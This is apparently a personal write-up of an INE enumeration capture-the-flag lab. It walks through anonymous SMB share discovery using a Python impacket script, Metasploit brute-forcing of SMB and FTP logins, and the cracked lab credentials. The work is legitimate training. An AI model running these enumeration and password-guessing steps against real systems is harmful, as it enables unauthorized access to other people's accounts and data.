# SC.03 - Assessment Methodologies: Enumeration CTF 1

### Overview
- Skill Check Lab: enumerate services on `target.ine.local`
- Capture **4 flags** (MD5 hash format)
- Focus: Samba/SMB enumeration, weak credentials, anonymous access
- Flag format: `FLAG1{MD5Hash}` — submit only the MD5 hash (exclude braces)

### Flag 1
- There is a samba share that allows anonymous access. Wonder what's in there!
- In order to find this for the lab, you have to make a bash script, I don't have one and I don't know how to make one so I asked AI
```bash 
#!/usr/bin/env python3
"""
Anonymous SMB share enumerator.
Usage: python3 smb_anon_enum.py [target] [wordlist]
Default target: target.ine.local
Default wordlist: /root/Desktop/wordlists/shares.txt
"""
import sys
from impacket.smbconnection import SMBConnection, SessionError

TARGET   = sys.argv[1] if len(sys.argv) > 1 else "target.ine.local"
WORDLIST = sys.argv[2] if len(sys.argv) > 2 else "/root/Desktop/wordlists/shares.txt"

# ---- 1. Establish anonymous SMB session ----
try:
    conn = SMBConnection(TARGET, TARGET, timeout=10)
    conn.login("", "")   # empty user/pass = anonymous / null session
    print(f"[+] Anonymous (null) session established with {TARGET}")
except Exception as e:
    print(f"[-] Anonymous login failed: {e}")
    sys.exit(1)

# ---- 2. Load wordlist ----
try:
    with open(WORDLIST) as f:
        shares = [l.strip() for l in f if l.strip() and not l.startswith("#")]
except FileNotFoundError:
    print(f"[-] Wordlist not found: {WORDLIST}")
    sys.exit(1)

print(f"[*] Loaded {len(shares)} candidate share names from {WORDLIST}\n")

# ---- 3. Try connecting to each share anonymously ----
found = []
for share in shares:
    try:
        conn.connectTree(share)
        print(f"[+] ANONYMOUS ACCESS -> \\\\{TARGET}\\{share}")
        found.append(share)
    except SessionError as e:
        # STATUS_ACCESS_DENIED / STATUS_BAD_NETWORK_NAME / etc.
        err = str(e)
        if "STATUS_ACCESS_DENIED" in err:
            print(f"[~] Exists but denied (needs auth): {share}")
    except Exception:
        pass

conn.close()

# ---- 4. Summary ----
print("\n" + "=" * 60)
if found:
    print(f"[+] {len(found)} share(s) allow anonymous access:")
    for s in found:
        print(f"    - \\\\{TARGET}\\{s}")
else:
    print("[-] No shares with anonymous access found.")
```
- Anyway I got the "pubfiles" share from this and simply `smbclient //target.ine.local/pubfiles -N`
- Find what's inside with `dir`
- Grab the flag `get flag1.txt` and `cat` it locally

### Flag 2
- One of the samba users have a bad password. Their private share with the same name as their username is at risk!
- Find the usernames with `enum4linux -a target.ine.local`
- Create a file with `vim users`
- Start up `msfconsole`
- Set the target `setg rhosts target.ine.local; setg rhost target.ine.local`
- Look for a brute force module `search smb`
- I `use auxiliary/scanner/smb/smb_login`
- Set the username file to the one created under "users": `set user_file users`
- Set the password file to the wordlist in root: `set pass_file /root/Desktop/wordlists/Unix_passwords.txt`
- `run` it
- Login to the smb share based on the hint with the username and password obtained: `smbclient //target.ine.local/josh -U josh%purple`
- Grab the flag `get flag2.txt` and `cat` locally
- Additionally a hint lets us know that there could be an FTP server running

### Flag 3
- Follow the hint given in the previous flag to uncover this one.
- Let's find it `nmap -p- -Pn target.ine.local`
- It is running at port 5554
- Try and connect `ftp target.ine.local -P 5554`
- It reveals usernames to crack: `ashley, alice, and amanda`
- Overwrite `users` file we created earlier with these new usernames
- Go back to `msfconsole` and `use auxiliary/scanner/ftp/ftp_login`
- Set the username file to the one created under "users": `set user_file users`
- Set the password file to the wordlist in root: `set pass_file /root/Desktop/wordlists/Unix_passwords.txt`
- We find `alice:pretty`
- Authenticate into the FTP server with `ftp alice@target.ine.local -P 5554` and enter `pretty` for the password
- Get the flag with `get flag3.txt`

### Flag 4
- This is a warning meant to deter unauthorized users from logging in.
- SSH? `ssh target.ine.local`
- Oh there's the flag

### Tools
- Nmap
- Metasploit
- Hydra
- enum4linux
- smbclient
- smbmap

### Note
- Wordlists located at: `/root/Desktop/wordlists`
- Submit only the MD5 hash string, e.g. `0f4d0db3668dd58cabb9eb409657eaa8`
- Enumerate systematically: SMB shares → users → weak passwords → hints → banners